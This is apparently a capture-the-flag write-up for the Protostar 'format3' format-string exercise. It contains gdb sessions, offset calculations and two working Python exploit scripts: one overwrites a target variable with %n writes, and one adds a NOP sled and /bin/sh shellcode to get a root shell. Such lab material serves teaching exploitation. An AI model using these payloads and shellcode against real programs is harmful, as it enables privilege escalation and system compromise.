# format3

## solution
```
(gdb) r
Starting program: /opt/protostar/bin/format3 
AAAABBBB%10$x%10$x

Breakpoint 1, 0x08048498 in vuln () at format3/format3.c:19
19	format3/format3.c: No such file or directory.
	in format3/format3.c
(gdb) x/x $esp
0xbffff580:	0xbffff590
(gdb) x/2x 0xbffff590
0xbffff590:	0x41414141	0x42424242
(gdb) p 0xbffff590 - 0xbffff580
$1 = 16
```

```
>>> 16 / 4 + 8
12
```

```
>>> 0x01025544
16930116
>>> 0x5544 - 8
21820
>>> 0x010102 - 8 - 21820
43966
```

```py
import struct

tar_p1 = struct.pack('I', 0x080496f4)
tar_p2 = struct.pack('I', 0x080496f4 + 0x2)

payload = tar_p1 + tar_p2

# 0x1025544

payload += '%21820d' + '%12$n'
payload += '%43966d' + '%13$n'

print payload
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./format3

...

you have modified the target :)
```

## shell
```py
import struct

tar_p1 = struct.pack('I', 0x080496d8)
tar_p2 = struct.pack('I', 0x080496d8 + 0x2)

buf = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9'
buf += '\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89'
buf += '\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'

nop = '\x90' * 0x80

payload = tar_p1 + tar_p2

# 0xbffff630

payload += '%62952d' + '%12$n'
payload += '%51727d' + '%13$n'

print payload + nop + buf
```

Here it is in action.
```
user@protostar:/opt/protostar/bin$ python /tmp/pwn.py | ./format3

...

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```
